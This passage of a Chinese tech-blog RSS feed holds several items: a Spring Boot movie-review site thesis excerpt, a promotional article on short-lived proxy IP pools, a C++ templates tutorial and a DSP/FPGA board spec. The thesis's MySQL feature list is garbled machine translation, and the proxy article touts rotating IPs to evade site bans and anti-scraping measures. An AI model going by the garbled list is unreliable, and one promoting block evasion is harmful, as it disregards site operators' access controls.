      <description>首页编程日记开发工具嵌入式服务器运维Spring Boot技术栈在电影评论网站中的应用news/2025/10/31 17:53:33/2相关技术2.1 MYSQL数据库MySQL是一个真正的多用户、多线程SQL数据库服务器。 是基于SQL的客户/服务器模式的关系数据库管理系统，它的有点有有功能强大、使用简单、管理方便、安全可靠性高、运行速度快、多线程、跨平台性、完全网络化、稳定性等，非常适用于Web站点或者其他应用软件的数据库后端的开发工作。此外，用户可利用许多语言编写访问MySQL数据库的程序。作为开放源代码运动的产物之一，MySQL关系数据库管理系统越来越受到人们的青睐，应用范围也越来越广。速度和易用性使MySQL特别适用于Web站点或应用软件的数据库后端的开发工作。MYSQL数据库具有以下特点：1、C和C ++中使用和测试，以确保源代码的编译器的便携性和灵活性。2、支持多种操作系统AIX的，FreeBSD下，HP-UX，Linux和Mac OS中，Novell公司的Netware，OpenBSD系统，OS/2裹时，Solaris，Windows等。3、提供了用于不同的编程语言的API。编程语言，如C, C ++，Python和Java的，的Perl，PHP，埃菲尔铁塔，Ruby和Tcl的。4、以及使用的CPU资源来支持多线程。5、算法优化查询SQL，切实提高搜索速度。6、网络上的客户端和服务器可以用来编程任何独立的编程环境，也有中国，GB2312，BIG5，日文写作，一般基金，用于支持多国语言，并且可以嵌入在数据表和其他软件shift_jis访问柱可以用作的名称。7、TCP / IP，ODBC和JDBC数据库，并提供连接到其他。8、管理工具的管理，控制和优化数据库的操作。9、可以数以千万计的记录在一个大的数据库。2.2 B/S结构B/S架构是一种基于互联网系统的软件系统开发架构，是现如今在软件系统开发中采用非常大量的一种软件系统结构。现如今B/S架构已经被大量使用，打破了C/S结构的结构，给基于网络结构的软件系统提供了良好的支持。B/S架构伴随着计算机网络技术发展而逐步的发展和更新。伴随着互联网的进一步发展，就要求大多数的管理系统要求不仅仅可以在一台电脑上使用，同时可以在接入互联网的其他电脑也可以使用对系统进行操作和使用。在这样的背景下基于B/S架构的软件系统设计方法得到了越来越大量的使用，基础部分也在不断的更新。B/S架构是利用操作系统中的浏览器来进行使用的，不是一种窗体软件系统，不需要在使用系统的电脑上进行安装。B/S架构的运行方式是在远程的服务器上把开发的软件系统部署在远程的服务器上，在部署好软件系统之后就可以实现在任何接入互联网的电脑上访问部署好的软件系统。B/S架构给使用管理系统的用户带来极大的便利。在三层体系结构的B/S（Browser/Server，浏览器/服务器结构）系统中，用户可以通过浏览器向分布在网络上的众多服务器发出请求。B/S系统极大地简化了客户机的工作量，客户机上只需要安装、配置少量的客户端运行软件即可，服务器将担负大量的工作，对数据库的访问以及应用程序的执行都将由服务器来完成。B/S架构的不断成熟，主要使用WWW浏览器技术，结合多种浏览器脚本语言，用通用浏览器需要实现原本复杂的专有软件来实现的强大功能，并节约了开发成本，是一种新的软件架构。B/S系统包括：表示逻辑层，控制逻辑层，数据展现层，三层是相对独立又相互关联。2.3 Spring Boot框架简介Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者。SpringBoot可以与经典的Java开发工具一起使用或者作为命令行工具安装。无论如何，需要JavaSDK1.6或者更高版本，本项目用到的是JDK1.8版本。3系统分析3.1可行性分析通过对本电影评论网站实行的目的初步调查和分析，提出可行性方案并对其一一进行论证。我们在这里主要从技术可行性、经济可行性、操作可行性等方面进行分析。3.1.1技术可行性本电影评论网站采用SSM框架，JAVA作为开发语言，是基于WEB平台的B/S架构系统。（1）Java提供了稳定的性能、优秀的升级性、更快速的开发、更简便的管理、全新的语言以及服务。整个系统帮用户做了大部分不重要的琐碎的工作。（2）基于B/S模式的系统的开发已发展日趋成熟。（3）众所周知，Java是面向对象的开发语言。程序开发员可以在Eclipse平台上面方便的使用一些已知的解决方案。因此，电影评论网站在开发技术上具有很高可行性，且开发人员掌握了一定的开发技术，所以此系统的开发技术具有可行性。3.1.2经济可行性本电影评论网站采用的软件都是开源的，这样能够削减很多的精力和资源，降低开发成本。同时对计算机的配置要求也极低，即使是淘汰下来的计算机也能够满足需要，因此，本系统在经济上是完全具有可行性的，所以在经济上是十分可行的。3.1.3操作可行性本电影评论网站的界面简单易操作，用户只要平时有在用过电脑，都能进行访问和操作。本系统具有易操作、易管理、交互性好的特点，在操作上是非常简单的，因此在操作上具有很高的可行性。综上所述，此系统开发目标已明确，在技术、经济和操作方面都具有很高的可行性，并且投入少、功能完善、管理方便，因此系统的开发是完全可行的。3.2系统性能分析3.2.1 系统安全性此电影评论网站要严格控制管理权限，具体要求如下：（1）要想对电影评论网站进行管理，首先要依靠用户名和密码在系统中登陆，无权限的用户不可以通过任何方式登录系统和对系统的任何信息和数据进行查看，这样可以保证系统的安全可靠性和准确性。（2）在具体实现中对不同的权限进行设定，不同权限的用户在系统中登陆后，不可以越级操作。3.2.2 数据完整性（1）所有记录信息要保持全面，信息记录内容不可以是空。（2）各种数据间相互联系要保持正确。（3）相同数据在不同记录中要保持一致。3.3系统界面分析目前，界面设计已经成为对软件质量进行评价的一条关键指标，一个好的用户界面可以使用户使用系统的信心和兴趣增加，从而使工作效率提高，JSP技术是将JAVA语言作为脚本语言的，JSP网页给整个服务器端的JAVA库单元提供了一个接口用来服务HTTP的应用程序。创建动态页面比较方便。客户界面是指软件系统与用户交互的接口，往往涵盖输出、输入、人机对话的界面格式等。1.输出设计输出是由电脑对输入的基本信息进行解决，生成高质量的有效信息，并使之具有一定的格式，提供给管理者使用，这是输出设计的主要责任和目标。系统开发的过程与实施过程相反，并不是从输入设计到输出设计，而是从输出设计到输入设计。这是由于输出表格与使用者直接相联系，设计的目的应当是确保使用者可以很方便的使用输出表格，并且可以将各部门的有用信息及时的反映出来。输出设计的准绳是既要整体琢磨不同管理层的所有需要，又要简洁，不要提供给用户不需要的信息。2.输入设计输入数据的收集和录入是比较麻烦的，需要非常多的人力和一定设备，而且经常出错。一旦输入系统的数据不正确，那么处理后的输出就会扩大这些错误，因此输入的数据的准确性对整个系统的性能起着决定性意义。输入设计有以下几点原则：1）输入量应尽量保持在能够满足处理要求的最低限度。输入量越少，错误率就会越少，数据的准备时间也越少。2）应尽可能的使输入的准备以及输入的过程进行时比较方便，这样使错误的发生率降低。3）应尽量早检查输入数据（尽量接近原数据发生点）,以便使错误更正比较及时。4）输入数据尽早地记录成其处理所需的形式，以防止数据由一种介质转移到另一种介质时需要转录而可能发生的错误。3.4系统流程和逻辑图3-3登录流程图图3-4修改密码流程图http://www.ppmy.cn/news/1540395.html相关文章使用短效IP池的优势是什么？短效IP池作为代理IP服务中一种独特的资源管理方式&amp;#xff0c;其应用已经在数据采集、市场分析和网络安全等多个领域中展示出强大的功能。尽管“短效”听起来似乎意味着某种限制&amp;#xff0c;然而在某些特定的应用场景下&amp;#xff0c;短效IP池却提供了无可比拟的优势。本文将详细…阅读更多...C++ 模板（基础）前言&amp;#xff1a; 
C 中的模板是一个强大的功能&amp;#xff0c;允许程序员编写通用的代码&amp;#xff0c;这些代码可以处理任何数据类型。模板使得代码更加灵活和可重用&amp;#xff0c;而不必为每种数据类型编写重复的代码。下面详细解释 C 中的模板 
内容摘要&amp;#xff1a; 
本文内容包含…阅读更多...8-基于双TMS320C6678 + XC7K420T的6U CPCI Express高速数据处理平台1、板卡概述 板卡由我公司自主研发&amp;#xff0c;基于6UCPCI架构&amp;#xff0c;处理板包含双片TI DSP TMS320C6678芯片&amp;#xff1b;一片Xilinx公司FPGA XC7K420T-1FFG1156 芯片&amp;#xff1b;六个千兆网口&amp;#xff08;FPGA两个&amp;#xff0c;DSP四个&amp;#xff09;&amp;#xff1b;DSP与FPGA之…阅读更多...VS Code开发qt项目没整明白&amp;#xff0c;尴尬  安装扩展  设置cmake路径 前提是已经安装了QT 报错  用msvc选windows启动&amp;#xff0c;用mingw则选gdb启动阅读更多...php之is_null、empty 、isset 的区别目录 
1.isset()&amp;#xff1a; 
2.empty()&amp;#xff1a; 
3.is_null&amp;#xff1a; 
4.总结&amp;#xff1a; 在PHP中&amp;#xff0c;is_null、empty 和 isset 是三个用于检查变量状态的常用函数&amp;#xff0c;它们各自有不同的用途和行为&amp;#xff1a; 
1.isset()&amp;#xff1a; 
isset() 函数…阅读更多...MySQL 查找连续相同名称的记录组，并保留每组内时间最大的一条记录要求&amp;#xff1a;查找连续相同名称的记录组&amp;#xff0c;并保留每组内时间最大的一条记录&amp;#xff0c;同时计算每组记录的 num 总和。 今天有人问了我一个问题&amp;#xff0c;大致就是下面这样的数据结构&amp;#xff08;原谅我实在不知道怎么描述这个问题&amp;#xff09; 然后需要得到下面…阅读更多...[k8s理论知识]3.docker基础（二）隔离技术容器其实是一种沙盒技术&amp;#xff0c;其核心是通过约束和修改进程的动态表现&amp;#xff0c;为其创建一个边界。这个边界确保了应用与应用之间不会相互干扰&amp;#xff0c;同时可以方便在不同的环境中迁移&amp;#xff0c;这是PaaS最理想的状态。 
程序是代码的可执行镜像&amp;#xff0c;通常…阅读更多...请求的响应----状态码分为五大类(爬虫)前言 一个爬虫的成功与否&amp;#xff0c;在于你是否拿到了想要的数据&amp;#xff1b;一个请求的成功与否&amp;#xff0c;在于响应的状态码&amp;#xff0c;它标明了当前请求下这个响应的结果&amp;#xff0c;是好还是坏。上节课程学习了HTTPS和HTTP协议的各自优势&amp;#xff0c;本节课程进入到请求…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:33 +0000</pubDate>
    </item>
    <item>
      <title>使用短效IP池的优势是什么？</title>
      <link>https://www.ppmy.cn/news/1540394.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维使用短效IP池的优势是什么？news/2025/10/31 17:53:32/短效IP池作为代理IP服务中一种独特的资源管理方式，其应用已经在数据采集、市场分析和网络安全等多个领域中展示出强大的功能。尽管“短效”听起来似乎意味着某种限制，然而在某些特定的应用场景下，短效IP池却提供了无可比拟的优势。本文将详细探讨使用短效IP池的优势，以及如何在实际操作中最大化利用这些优势。1. 提高代理IP切换频率短效IP池的本质之一是其高频的IP切换特性。动态频繁的优势：降低IP检测风险：频繁的IP切换让目标网站很难进行有效的IP拉黑或跟踪，减少了采集被阻止的概率。多个请求的分散减负：尤其在进行大量短期请求时，高切换频次极大程度上减轻了单个IP的负担，提高访问成功率。2. 增强数据采集效率短效IP池在短期内可提供丰富的IP资源支持，是大规模数据采集的极佳选择。数据采集的保证：适应临时高峰需求：适合突发的高并发请求，按需分配IP资源，避免因流量过大导致的不可用。灵活应对反爬策略：很多目标网站设计了复杂的反爬机制，快速切换IP能有效突破此类限制。3. 优化市场活动效果在开展市场活动和在线推广时，短效IP池能够提供快速的方案支持。市场活动的促动：广告效果分析：通过更换不同的IP检测广告在不同地区或人群中的曝光效果。多点营销策略：短期内执行多点位市场操作，灵活调整策略应对各种市场环境变化。4. 提高用户访问体验对某些依赖于复杂访问路径的应用，短效IP池让用户访问体验更为流畅。用户体验的增强：减少用户刷新等待：通过代理池快速响应用户请求，降低网页刷新等待时间。提升访问速度：尤其在远程或者国际访问时，有效减少网络延迟。结论尽管“短效”听起来可能暗示着某种制约，然而在网络应用场景中，短效IP池以其灵活性和高效性成为不可或缺的资源。对于需要频繁IP切换、大规模短期数据采集或灵活市场活动的用户来说，短效IP池提供了极大的便捷和支持。在选择代理服务提供商时，使用具备高可靠性、高效率和全球覆盖能力的合作伙伴，将能为业务提供坚实而有力的支持。希望通过本文，您更好地理解短效IP池的多种优势，助您在复杂的网络环境中游刃有余。http://www.ppmy.cn/news/1540394.html相关文章C++ 模板（基础）前言&amp;#xff1a; 
C 中的模板是一个强大的功能&amp;#xff0c;允许程序员编写通用的代码&amp;#xff0c;这些代码可以处理任何数据类型。模板使得代码更加灵活和可重用&amp;#xff0c;而不必为每种数据类型编写重复的代码。下面详细解释 C 中的模板 
内容摘要&amp;#xff1a; 
本文内容包含…阅读更多...8-基于双TMS320C6678 + XC7K420T的6U CPCI Express高速数据处理平台1、板卡概述 板卡由我公司自主研发&amp;#xff0c;基于6UCPCI架构&amp;#xff0c;处理板包含双片TI DSP TMS320C6678芯片&amp;#xff1b;一片Xilinx公司FPGA XC7K420T-1FFG1156 芯片&amp;#xff1b;六个千兆网口&amp;#xff08;FPGA两个&amp;#xff0c;DSP四个&amp;#xff09;&amp;#xff1b;DSP与FPGA之…阅读更多...VS Code开发qt项目没整明白&amp;#xff0c;尴尬  安装扩展  设置cmake路径 前提是已经安装了QT 报错  用msvc选windows启动&amp;#xff0c;用mingw则选gdb启动阅读更多...php之is_null、empty 、isset 的区别目录 
1.isset()&amp;#xff1a; 
2.empty()&amp;#xff1a; 
3.is_null&amp;#xff1a; 
4.总结&amp;#xff1a; 在PHP中&amp;#xff0c;is_null、empty 和 isset 是三个用于检查变量状态的常用函数&amp;#xff0c;它们各自有不同的用途和行为&amp;#xff1a; 
1.isset()&amp;#xff1a; 
isset() 函数…阅读更多...MySQL 查找连续相同名称的记录组，并保留每组内时间最大的一条记录要求&amp;#xff1a;查找连续相同名称的记录组&amp;#xff0c;并保留每组内时间最大的一条记录&amp;#xff0c;同时计算每组记录的 num 总和。 今天有人问了我一个问题&amp;#xff0c;大致就是下面这样的数据结构&amp;#xff08;原谅我实在不知道怎么描述这个问题&amp;#xff09; 然后需要得到下面…阅读更多...[k8s理论知识]3.docker基础（二）隔离技术容器其实是一种沙盒技术&amp;#xff0c;其核心是通过约束和修改进程的动态表现&amp;#xff0c;为其创建一个边界。这个边界确保了应用与应用之间不会相互干扰&amp;#xff0c;同时可以方便在不同的环境中迁移&amp;#xff0c;这是PaaS最理想的状态。 
程序是代码的可执行镜像&amp;#xff0c;通常…阅读更多...请求的响应----状态码分为五大类(爬虫)前言 一个爬虫的成功与否&amp;#xff0c;在于你是否拿到了想要的数据&amp;#xff1b;一个请求的成功与否&amp;#xff0c;在于响应的状态码&amp;#xff0c;它标明了当前请求下这个响应的结果&amp;#xff0c;是好还是坏。上节课程学习了HTTPS和HTTP协议的各自优势&amp;#xff0c;本节课程进入到请求…阅读更多...SpringCloud Gateway 网关路由全自动实现方案动态网关路由 
实现动态路由需要将路由配置保存到Nacos&amp;#xff0c;然后在网关监听Nacos中的路由配置&amp;#xff0c;并实现配置热更新&amp;#xff0c;然而网关路由并不是自定义业务配置属性&amp;#xff0c;本身不具备热更新功能&amp;#xff01; 详情可以参考org.springframework.cloud.gat…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:32 +0000</pubDate>
    </item>
    <item>
      <title>C++ 模板（基础）</title>
      <link>https://www.ppmy.cn/news/1540393.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维C++ 模板（基础）news/2025/10/31 17:53:31/前言：C++ 中的模板是一个强大的功能，允许程序员编写通用的代码，这些代码可以处理任何数据类型。模板使得代码更加灵活和可重用，而不必为每种数据类型编写重复的代码。下面详细解释 C++ 中的模板内容摘要：本文内容包含最基本的函数模板和类模板的基础认识和使用，然后通过另一个角度，从函数模板的特化方面，介绍了函数模板的特化和类模板的特化，分析了模板为什么一般不能通过分离编译实现的原理，最后将模板的优劣势进行总结。函数模板在C语言中，我们要实现一个两数之和,当我们是实现出一个整数的加法函数进行两个整数的加法，当我们又有需求进行含有小数的数据运算时，浮点数进行隐式类型转换调用我们写的那个整形的加法函数，最后运算出来的结果会造成精度的丢失，要想进行精度的保留，我们又需要重新写一个结构一模一样的函数，只是数据的类型发生了改变，这就让人很难受，因此C++ 中提出泛型编程的概念，通过函数模板可以完美解决问题。函数模板的格式关键字template + &lt;class/typname T&gt;这里class和typname是等价的 这里模板参数可以用任意字母 一般用T通过关键字template 告诉编译器我们下面写的这个函数是一个函数模板当函数模板被调用时，模板参数T会进行实例化相对应的类型，例如当我们传参进行两个整数的运算时，模板参数T自动实例化成int,同理，当我们传参浮点数进行运算时，T会实例化出double。类模板类模板格式类模板的格式和函数模板相同关键字template + &lt;class/typname T&gt;这里class和typname是等价的 这里模板参数可以用任意字母 一般用T类模板通过类似于函数传参将模板参数进行实例化通过之前的学习我们接触过的类模板参数用途有好几种，其一就是例如C++标准库中的容器vector，通过类模板参数T，实现容器各种不同数据类型数据的存储，这里能够更好的体会泛型编程的好处，要是C++没有引入泛型编程，vector底层通过函数重载，得写各种类型存储vector容器。其二就是在模拟实现list中的时候，见识到了通过多定义模板参数更简洁高效实现了普通迭代器和const迭代器；其三，在实现反向迭代器时，利用类模板参数，通过正向迭代器复用进行实现类型模板参数解决typedef后只能存储单个数据的窘境非类型模板参数非类型模板参数可以增强模板的灵活性，它允许模板定义中使用常数作为模板参数类型模板参数和非类型模板参数的区分类型模板参数顾名思义，用来表示数据的类型的例如通过静态数组类模板中的T,非类型模板参数，而N就属于非类型模板参数利用非类型模板参数定义静态数组类，通过宏也可以进行实现，但是会出现局限，例如以上代码当我们想要进行将静态数组a1开十个空间，将静态数组a2开二十个空间时，通过宏就没有办法进行解决，但是通过非模板类型参数就可以轻易解决。非类型模板参数的注意事项能够作为非类型模板参数的只能是整形家族中的 例如 int、size_t、long、char、bool非类型模板参数在编译期就能够确认结果模板的特化函数模板的特化通过特化去解决特别的问题，例如我们想要取通过指针比较指针指向的地址处数据的大小，如果我们不进行处理直接用指针进行比较的话，比较的是指针指向的地址在进行比较，显然这并不是我们想要的结果，所以说不符合模板的情况下我们需要进行特化处理。函数模板特化的格式：template&lt;&gt;函数类型 函数名&lt;函数特化的类型&gt;（形参）注意：函数形参表的类型和个数必须和模板函数相同，否则编译器会报一些奇奇怪怪的错误解决办法：方法一：通过函数重载进行解决方法二：通过函数模板的特化进行解决思考：当出现模板解决不了的问题，两种解决办法的代码都存在时，会走哪一部分的代码去解决问题呢？？当然是函数重载啦，因为函数重载是直接给出来的，而函数模板的特化还是需要实例化出来相对应的类型，然后再进行走函数特化的部分。在涉及到模板处理不了的问题时，我们一般通过函数重载进行解决，函数重载的代码可读性高。类模板的特化同样是去处理通过模板难以处理的问题全特化全特化是将模板所有的模板参数都进行确定化偏特化偏特化是一种对于模板加了一些限制，分为部分特化和参数进一步限制两种类型部分特化将一部分的参数进行特化处理参数进一步限制将参数进行进一步限制，所设计的一个特化版本模板的分离编译什么是模板的分离编译一个程序有多个源文件共同组成，每个源文件又会单独编译成目标文件（例如，.o或.obj文件），然后通过链接器生成可执行文件对于我们程序来说通过使用分离编译能够增强代码的可维护性，我们通常都会使用分离编译和模块化进行程序的开发，但是模板的分离编译并不是这样，使用模板的函数和类都不建议使用模板的分离编译，那么这是为什么呢，我们下面通过分析解决一下这个问题。假如进行模板分离编译使用模板的注意事项：不将模板进行分离编译，防止出现链接不上若进行分离编译，进行显示实例化（不推荐使用）模板总结优点：通过使用模板，节省资源，增加开发效率缺点：代码膨胀，编译速率变慢出现模板编译错误时，错误信息非常凌乱，不易定位错误http://www.ppmy.cn/news/1540393.html相关文章8-基于双TMS320C6678 + XC7K420T的6U CPCI Express高速数据处理平台1、板卡概述 板卡由我公司自主研发&amp;#xff0c;基于6UCPCI架构&amp;#xff0c;处理板包含双片TI DSP TMS320C6678芯片&amp;#xff1b;一片Xilinx公司FPGA XC7K420T-1FFG1156 芯片&amp;#xff1b;六个千兆网口&amp;#xff08;FPGA两个&amp;#xff0c;DSP四个&amp;#xff09;&amp;#xff1b;DSP与FPGA之…阅读更多...VS Code开发qt项目没整明白&amp;#xff0c;尴尬  安装扩展  设置cmake路径 前提是已经安装了QT 报错  用msvc选windows启动&amp;#xff0c;用mingw则选gdb启动阅读更多...php之is_null、empty 、isset 的区别目录 
1.isset()&amp;#xff1a; 
2.empty()&amp;#xff1a; 
3.is_null&amp;#xff1a; 
4.总结&amp;#xff1a; 在PHP中&amp;#xff0c;is_null、empty 和 isset 是三个用于检查变量状态的常用函数&amp;#xff0c;它们各自有不同的用途和行为&amp;#xff1a; 
1.isset()&amp;#xff1a; 
isset() 函数…阅读更多...MySQL 查找连续相同名称的记录组，并保留每组内时间最大的一条记录要求&amp;#xff1a;查找连续相同名称的记录组&amp;#xff0c;并保留每组内时间最大的一条记录&amp;#xff0c;同时计算每组记录的 num 总和。 今天有人问了我一个问题&amp;#xff0c;大致就是下面这样的数据结构&amp;#xff08;原谅我实在不知道怎么描述这个问题&amp;#xff09; 然后需要得到下面…阅读更多...[k8s理论知识]3.docker基础（二）隔离技术容器其实是一种沙盒技术&amp;#xff0c;其核心是通过约束和修改进程的动态表现&amp;#xff0c;为其创建一个边界。这个边界确保了应用与应用之间不会相互干扰&amp;#xff0c;同时可以方便在不同的环境中迁移&amp;#xff0c;这是PaaS最理想的状态。 
程序是代码的可执行镜像&amp;#xff0c;通常…阅读更多...请求的响应----状态码分为五大类(爬虫)前言 一个爬虫的成功与否&amp;#xff0c;在于你是否拿到了想要的数据&amp;#xff1b;一个请求的成功与否&amp;#xff0c;在于响应的状态码&amp;#xff0c;它标明了当前请求下这个响应的结果&amp;#xff0c;是好还是坏。上节课程学习了HTTPS和HTTP协议的各自优势&amp;#xff0c;本节课程进入到请求…阅读更多...SpringCloud Gateway 网关路由全自动实现方案动态网关路由 
实现动态路由需要将路由配置保存到Nacos&amp;#xff0c;然后在网关监听Nacos中的路由配置&amp;#xff0c;并实现配置热更新&amp;#xff0c;然而网关路由并不是自定义业务配置属性&amp;#xff0c;本身不具备热更新功能&amp;#xff01; 详情可以参考org.springframework.cloud.gat…阅读更多...今日总结10.18Exception 和Error 有什么区别 
Exception和Error都是Java等编程语言中异常处理机制的重要组成部分&amp;#xff0c;它们都继承自Throwable类。以下是两者的主要区别&amp;#xff1a; 
定义与性质 
Error&amp;#xff1a; 
1.表示严重的系统级错误&amp;#xff0c;如内存溢出&amp;#xff08;OutOfM…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:31 +0000</pubDate>
    </item>
    <item>
      <title>8-基于双TMS320C6678 + XC7K420T的6U CPCI Express高速数据处理平台</title>
      <link>https://www.ppmy.cn/news/1540392.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维8-基于双TMS320C6678 + XC7K420T的6U CPCI Express高速数据处理平台news/2025/10/31 17:53:30/1、板卡概述板卡由我公司自主研发，基于6UCPCI架构，处理板包含双片TI DSP TMS320C6678芯片；一片Xilinx公司FPGA XC7K420T-1FFG1156 芯片；六个千兆网口（FPGA两个，DSP四个）；DSP与FPGA之间 RapidIOX4互联， DSP 之间 Hyperlink X4 互联；FPGA 提供12个GTX连于背板（GTX支持6.25Gbps的传输频率）；每颗DSP外接1GB的DDR3,64bit位宽，32MB Nor Flash；FPGA 外接2组DDR3，各512MB，64bit位宽，32MB Nor Flash；通过PCIe桥连接DSP的PCIe和FPGA的PCIe口，PCIe对外X4模式；FPGA连接不少于160根普通IO到CPCIe的P4，P5连接器。2、处理板技术指标板卡要求采用双片TI DSP TMS320C6678芯片，8核，主频1G。板卡采用Xilinx公司FPGA XC7K420T-1FFG1156 芯片。前面板 两个DSP各出一个千兆网口，另外2个网络连于背板。前面板FPGA出两个千兆网口，6个SFF模块光纤，支持5Gbps前面板出4个指示灯，1个复位按钮。DSP与FPGA之间 RapidIOX4互联，DSP的Uart，SPI，I2C连接于FPGA。DSP 之间 Hyperlink X4 互联。FPGA 提供12个GTX连于背板，支持4个X2，1个X4的工作模式配置。GTX最高工作频率为6.25Gbps。每颗DSP外接1GB的DDR3,64bit位宽；32MB Nor Flash.FPGA 外接2组DDR3，各512MB，64bit位宽，32MB Nor Flash，在原理图设计阶段，如FPGA的I/O引脚资源不够，则可将DDR3位宽调整为32BIT宽。DSP 支持远程网络加载，PCIe加载；FPGA支持Master SelectMAP和Master BPI加载，同时支持DSP0或者DSP1的SPI口对FPGA进行动态加载和对配置芯片程序更新。FPGA连接不少于160根普通IO到CPCIe的P4，P5连接器。FPGA能读取背板槽位信息,ID[3:0]。FPGA 外接E2PROM。板卡芯片要求工业级。供电 采用 +5V +12V 双电源。板卡结构标准CPCIe 6U大小。整板冷却，支持加固。3、软件系统3.1 DSP底层软件包括（1）DSP的DDR3测试程序；（2）DSP的Nor Flash 擦写程序；（3）DSP的网络接口测试，SGMII互传程序；（4）DSP的HyperLink互连传输程序；（5） DSP的SPI接口程序；（6）DSP的I2C E2PROM操作程序；（7）DSP的RapidIO接口驱动程序；（8）DSP的Boot Load引导程序；（9）DSP的多核加载测试程序；（10）DSP的网络加载程序；（10）DSP的GPIO中断服务测试程序；（11） DSP对 FPGA的动态加载和配置程序更新程序；3.2 FPGA底层软件包括（1）FPGA的DDR3驱动接口程序；（2）FPGA的网络接口驱动程序；（3）FPGA的 Nor Flash接口驱动程序；（4）FPGA与DSP的RapidIO驱动程序；（5）与背板互连DSP板卡的GTX传输程序；（6） FPGA的光纤接口驱动程序；（7） 配置FPGA的控制程序；（8） 从FPGA的电源管理，复位管理，配置管理程序；4、物理特性：尺寸：6U CPCIe板卡，大小为160X233.35mm。工作温度：0℃～ +55℃ ，支持工业级 -40℃～ +85℃工作湿度：10%～80%5、供电要求:双直流电源供电。整板功耗 50W。电压：+5V 5A ，+3.3V 6A。纹波：≤10%http://www.ppmy.cn/news/1540392.html相关文章VS Code开发qt项目没整明白&amp;#xff0c;尴尬  安装扩展  设置cmake路径 前提是已经安装了QT 报错  用msvc选windows启动&amp;#xff0c;用mingw则选gdb启动阅读更多...php之is_null、empty 、isset 的区别目录 
1.isset()&amp;#xff1a; 
2.empty()&amp;#xff1a; 
3.is_null&amp;#xff1a; 
4.总结&amp;#xff1a; 在PHP中&amp;#xff0c;is_null、empty 和 isset 是三个用于检查变量状态的常用函数&amp;#xff0c;它们各自有不同的用途和行为&amp;#xff1a; 
1.isset()&amp;#xff1a; 
isset() 函数…阅读更多...MySQL 查找连续相同名称的记录组，并保留每组内时间最大的一条记录要求&amp;#xff1a;查找连续相同名称的记录组&amp;#xff0c;并保留每组内时间最大的一条记录&amp;#xff0c;同时计算每组记录的 num 总和。 今天有人问了我一个问题&amp;#xff0c;大致就是下面这样的数据结构&amp;#xff08;原谅我实在不知道怎么描述这个问题&amp;#xff09; 然后需要得到下面…阅读更多...[k8s理论知识]3.docker基础（二）隔离技术容器其实是一种沙盒技术&amp;#xff0c;其核心是通过约束和修改进程的动态表现&amp;#xff0c;为其创建一个边界。这个边界确保了应用与应用之间不会相互干扰&amp;#xff0c;同时可以方便在不同的环境中迁移&amp;#xff0c;这是PaaS最理想的状态。 
